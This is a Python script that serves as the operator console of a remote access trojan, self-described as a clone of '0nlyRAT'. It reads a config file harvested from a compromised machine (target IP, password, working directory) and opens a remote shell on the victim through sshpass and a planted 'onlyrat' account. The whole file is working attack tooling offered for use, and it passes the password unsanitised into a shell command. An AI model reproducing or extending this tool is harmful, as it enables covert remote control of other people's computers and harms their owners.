#!/usr/bin/python
# python console for the RAT to interact with target pc

import os
import sys
import getpass
from modules import *

banner = r"""
  /$$$$$$            /$$           /$$$$$$$   /$$$$$$  /$$$$$$$$
 /$$$_  $$          | $$          | $$__  $$ /$$__  $$|__  $$__/
| $$$$\ $$ /$$$$$$$ | $$ /$$   /$$| $$  \ $$| $$  \ $$   | $$   
| $$ $$ $$| $$__  $$| $$| $$  | $$| $$$$$$$/| $$$$$$$$   | $$   
| $$\ $$$$| $$  \ $$| $$| $$  | $$| $$__  $$| $$__  $$   | $$   
| $$ \ $$$| $$  | $$| $$| $$  | $$| $$  \ $$| $$  | $$   | $$   
|  $$$$$$/| $$  | $$| $$|  $$$$$$$| $$  | $$| $$  | $$   | $$   
 \______/ |__/  |__/|__/ \____  $$|__/  |__/|__/  |__/   |__/   
                         /$$  | $$                              
                        |  $$$$$$/                              
                         \______/                               
 
                
            [::] The Famous 0nlyRAT Clone Project :) [::]
"""

help_menu = """
            [::] 0nlyRAT help menu [::]

            Arguments:            
                                   ____                                                               ____  
                                  |                                                                       |
                                  |  place the config file name with extension returned from the target   |
            -f  <config file>   = |                                                                       |
                                  |  File must have .rat extension                                        |
                                  |____                                                               ____|
            
            
            Example:
            python3 main.py -f <config file>
"""

options_menu = """
            [*] Select Payload (0...) [*]

            Payloads:
                [0] Remote Console
"""

username = getpass.getuser()
header = f"{username}@onlyrat $ "
IP_KEY = "IPADDRESS"
PASS_KEY = "PASSWORD"
WORKINGDIR_KEY = "WORKINGDIR"

def read_config(config_file):
    if not config_file.endswith(".rat") or not os.path.exists(config_file):
        print(f"Error: Config file '{config_file}' is not valid.")
        raise Exception
    configuration = {}
    read_lines = open(config_file, "r").readlines()
    configuration[IP_KEY] = read_lines[0].strip()
    configuration[PASS_KEY] = read_lines[1].strip()
    configuration[WORKINGDIR_KEY] = read_lines[2].strip()
    return configuration

# remotely connect RAT to target
def connect(tgt_ipv4,tgt_pword):
    os.system(f"sshpass -p \"{tgt_pword}\" ssh onlyrat@{tgt_ipv4}")


def os_detection():
    if os.name == "nt":
        return "w"
    if os.name == "posix":
        return "l"

# command line interface
def cli(arguments):
    print(banner)
    try:
        if not arguments:
            raise Exception
        configuration = read_config(sys.argv[2])
        tgt_ipv4 = configuration.get(IP_KEY)
        tgt_pword = configuration.get(PASS_KEY)
        tgt_wd = configuration.get(WORKINGDIR_KEY)
        print(options_menu)
        option = input(f"{header}")
        if option == "0":
            connect(tgt_ipv4,tgt_pword)
    except Exception:
        print(help_menu)

def main():
    # checks for arguments
    try:
        sys.argv[1]
        sys.argv[2]
        if sys.argv[1] != "-f":
            raise Exception
    except IndexError:
        arguments_exist = False
    except Exception:
        arguments_exist = False
    else:
        arguments_exist = True
    # run commandline interface
    cli(arguments_exist)

if __name__ == "__main__":
    main()